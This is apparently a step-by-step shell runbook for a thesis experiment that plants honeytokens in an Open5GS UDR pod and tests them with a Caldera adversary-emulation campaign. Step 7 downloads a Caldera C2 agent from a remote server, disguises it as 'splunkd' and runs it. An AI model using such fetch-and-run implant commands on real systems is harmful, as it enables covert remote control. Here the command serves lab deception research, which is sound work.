# ==============================================
# [1/16] Set Variables and Create the Results Directory
# ==============================================

UDR_POD=$(kubectl -n open5gs get pod \
-o jsonpath='{.items[?(@.metadata.labels.app\.kubernetes\.io/name=="udr")].metadata.name}')

echo "$UDR_POD"

NS="open5gs"

HONEY_DENSITY=0
echo "$HONEY_DENSITY"

RUN_NR=1

RUN_DIR=~/experiments/MA_Campaign/density-$HONEY_DENSITY/run"${RUN_NR}"
echo "$RUN_DIR"

DEPLOYMENT=$(kubectl -n "$NS" get deployment \
  -l app.kubernetes.io/name=udr \
  -o jsonpath='{.items[0].metadata.name}')

echo "$DEPLOYMENT"

# ==============================================
# [2/16] Deploy Honey ENVs (Don’t run for 0% density)
# ==============================================

kubectl -n "$NS" exec "$UDR_POD" -- env | wc -l
  
python3 ~/tools/deception/deploy-envs-and-binaries.py \
  --asset-type env \
  --pod "$UDR_POD" \
  --namespace "$NS" \
  --manifest "$RUN_DIR/honey-assets-manifest.csv" \
  --honeyfile-manifest "$RUN_DIR/honeyfiles.csv" \
  --env-output "$RUN_DIR/honey-env.sh"
  

column -s, -t < "$RUN_DIR/honey-assets-manifest.csv"

kubectl -n "$NS" set env deployment/"$DEPLOYMENT" \
  $(python3 -c '
import csv, sys
with open(sys.argv[1], newline="") as f:
    for row in csv.DictReader(f):
        if row["asset_type"] == "env":
            print(f"{row['"'"'name'"'"']}={row['"'"'value_or_target'"'"']}")
' "$RUN_DIR/honey-assets-manifest.csv")

kubectl -n "$NS" rollout status deployment/"$DEPLOYMENT" \
  --timeout=120s

# Wait until the rollout is finished and make sure the UDR_POD variable is updated to the newly created pod.

# ==============================================
# [3/16] Deploy Honeyfiles
# ==============================================

python3 ~/tools/deception/deploy-density-dynamic.py \
  "$HONEY_DENSITY" \
  --seed 42 \
  --namespace open5gs \
  --pod "$UDR_POD" \
  --root /opt/open5gs/etc \
  --manifest "$RUN_DIR/honeyfiles.csv"

# ==============================================
# [4/16] Deploy Honey Binaries and Processes
# ==============================================

python3 ~/tools/deception/deploy-envs-and-binaries.py \
  --asset-type binary \
  --pod "$UDR_POD" \
  --namespace "$NS" \
  --manifest "$RUN_DIR/honey-assets-manifest.csv" \
  --honeyfile-manifest "$RUN_DIR/honeyfiles.csv" \
  --env-output "$RUN_DIR/honey-env.sh";

# ==============================================
# [5/16] Configure Bash History in UDR Pod
# ==============================================
kubectl -n "$NS" exec "$UDR_POD" -- sh -c '
cat >> "$HOME/.bashrc" <<'"'"'EOF'"'"'

# Interactive Bash history
export HISTFILE="$HOME/.bash_history"
export HISTSIZE=1000
export HISTFILESIZE=2000
shopt -s histappend
PROMPT_COMMAND="history -a"
EOF
'

# ==============================================
# [6/16] Create empty honeyasset manifest (Run only for 0%)
# ==============================================

TIMESTAMP=$(date -u +"%Y-%m-%dT%H:%M:%S.%NZ")

cat > "$RUN_DIR/honey-assets-manifest.csv" <<EOF
asset_type,path,name,role,value_or_target,size_bytes,details,pod,namespace,deployment_time
binary,/bin/ping,ping,behavioral_trap_ping,,,behavioral honey binary,$UDR_POD,open5gs,$TIMESTAMP
binary,/usr/bin/curl,curl,behavioral_trap_curl,,,behavioral honey binary,$UDR_POD,open5gs,$TIMESTAMP
EOF


# ==============================================
# [7/16] Set Up Caldera Sandcat (Terminal and check in WebUI)
# ==============================================
# In a different terminal. Leave it running
UDR_POD=$(kubectl -n open5gs get pod \
-o jsonpath='{.items[?(@.metadata.labels.app\.kubernetes\.io/name=="udr")].metadata.name}')

echo "$UDR_POD"

kubectl -n open5gs exec -it "$UDR_POD" -- /bin/sh

server="http://192.168.100.69:8888";
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > splunkd;
chmod +x splunkd;
./splunkd -server $server -group red -v


# ==============================================
# [8/16] Terminal 1: Tetragon Log
# ==============================================

~/tools/deception/watch-tetragon.sh \
  --namespace open5gs \
  --pod "$UDR_POD" \
  --since 1s \
  --output "$RUN_DIR/tetragon-udr.log"

# ==============================================
# [9/16] Terminal 2: Tetragon Log
# ==============================================
# Set the variables from Step 1 here too.

~/tools/deception/live-honeyAssets-metrics.py \
  --manifest "$RUN_DIR/honeyfiles.csv" \
  --asset-manifest "$RUN_DIR/honey-assets-manifest.csv" \
  --tetragon-log "$RUN_DIR/tetragon-udr.log" \
  --pod "$UDR_POD" \
  --namespace "$NS" \
  --target-nf udr \
  --output ~/tools/deception/node-exporter/textfile_collector/thesis-honeyfiles.prom \
  --interval 1

# ==============================================
# [10/16] Start Caldera Campaign in WebUI
# ==============================================
# Navigate to Operations and selecte the Adversary and start it. Wait until it is finished (around 30 minutes).

# ==============================================
# [11/16] Download WebUI Caldera Log
# ==============================================
# After the campaign finishes, download the Full Report, Event Logs and CSV report from the WebUI, using the button on the top right labelled with "Download Report".

# ==============================================
# [12/16] Export, Inspect and Evaluate generated data
# ==============================================

kubectl -n open5gs cp \
  "$UDR_POD":/tmp/thesis-discovery.log \
"$RUN_DIR/caldera-discovery.log"
  
~/tools/deception/evaluate-honey-all-types.py \
  --env-manifest "$RUN_DIR/honey-assets-manifest.csv" \
  --binary-manifest "$RUN_DIR/honey-assets-manifest.csv" \
  --honeyfile-manifest "$RUN_DIR/honeyfiles.csv" \
  --discovery-log "$RUN_DIR/caldera-discovery.log" \
  --tetragon-log "$RUN_DIR/tetragon-udr.log" \
  --output-manifest "$RUN_DIR/results-honeytypes-evaluated.csv" \
  --summary "$RUN_DIR/results-evaluation-summary.json"


curl -s http://localhost:9093/api/v2/alerts | \
jq '[.[] | select(.labels.experiment == "thesis-deception") | {
  alertname: .labels.alertname,
  state: .status.state,
  startsAt: .startsAt,
  endsAt: .endsAt,
  summary: .annotations.summary
}]' > "$RUN_DIR/alertmanager-alerts.json"

# ==============================================
# [13/16] Clean Up: Remove artifacts and reset metrics
# ==============================================
# It is important to have the same RUN_DIR still saved as variable, for this to work.
kubectl -n open5gs exec "$UDR_POD" -- sh -c \
': > /tmp/thesis-discovery.log'

kubectl -n open5gs exec "$UDR_POD" -- \
  rm -rf \
	  /opt/open5gs/staged \
    /tmp/art-fish.txt \
    /tmp/art.sh \
    /tmp/art-staging \
    /tmp/keyfile_locations.txt \
    /opt/open5gs/staged.tar.gz
 
    
kubectl -n open5gs exec "$UDR_POD" -- \
  find /opt/open5gs/etc -type f | wc -l
  

cat > ~/tools/deception/node-exporter/textfile_collector/thesis-honeyfiles.prom <<'EOF'
thesis_honeyfiles_total{target_namespace="open5gs",target_nf="udr"} 0
thesis_honey_assets_discovered{target_namespace="open5gs",target_nf="udr"} 0
thesis_honey_assets_interacted{target_namespace="open5gs",target_nf="udr"} 0
thesis_honeyfiles_interacted{target_namespace="open5gs",target_nf="udr"} 0
thesis_honeyenvs_interacted{target_namespace="open5gs",target_nf="udr"} 0
thesis_honeybinaries_interacted{target_namespace="open5gs",target_nf="udr"} 0
thesis_suspicious_exec_events{target_namespace="open5gs",target_nf="udr"} 0
thesis_suspicious_binaries_seen{target_namespace="open5gs",target_nf="udr"} 0
EOF


# ==============================================
# [14/16] Remove ENV variables
# ==============================================
kubectl -n "$NS" set env deployment/"$DEPLOYMENT" \
  $(python3 -c '
import csv, sys
with open(sys.argv[1], newline="") as f:
    for row in csv.DictReader(f):
        if row["asset_type"] == "env":
            print(row["name"] + "-")
' "$RUN_DIR/honey-assets-manifest.csv")

kubectl -n "$NS" rollout status deployment/"$DEPLOYMENT" \
  --timeout=120s

# Wait for the roll out to finished and update the UDR_POD variable.
# The rollout causes the honey files and binaries to be removed as well.

# ==============================================
# [15/16] Remove Honeyfiles
# ==============================================
# This step is not needed when the pod was restarted after removing ENV variables.
# Removing honeyfiles *only:

python3 ~/tools/deception/deploy-density-dynamic.py \
  0 \
  --seed 42 \
  --namespace open5gs \
  --pod "$UDR_POD" \
  --root /opt/open5gs/etc \
  --manifest "$RUN_DIR/cleanup-honeyfiles-empty.csv" \
  --previous-honey-manifest "$RUN_DIR/honeyfiles.csv" \
  --dry-run


# ==============================================
# [6/16] Remove Honey Binaries
# ==============================================
# This step is not needed when the pod was restarted after removing ENV variables.
# Removing honey binaries *only:

# This stops the running process
MIGRATION_PATH=$(python3 -c '
import csv, sys
with open(sys.argv[1], newline="") as f:
    for row in csv.DictReader(f):
        if row["asset_type"] == "process":
            print(row["path"])
            break
' "$RUN_DIR/honey-assets-manifest.csv")


# This removes the binaries written in the manifest
python3 -c '
import csv, subprocess, sys

manifest = sys.argv[1]
namespace = sys.argv[2]
pod = sys.argv[3]

with open(manifest, newline="") as f:
    for row in csv.DictReader(f):
        if row["asset_type"] == "binary" and row["path"].startswith("/opt/open5gs/bin/"):
            path = row["path"]
            print(f"Removing {path}")
            subprocess.run([
                "kubectl", "-n", namespace,
                "exec", pod, "--",
                "rm", "-f", path
            ], check=True)
' "$RUN_DIR/honey-assets-manifest.csv" "$NS" "$UDR_POD"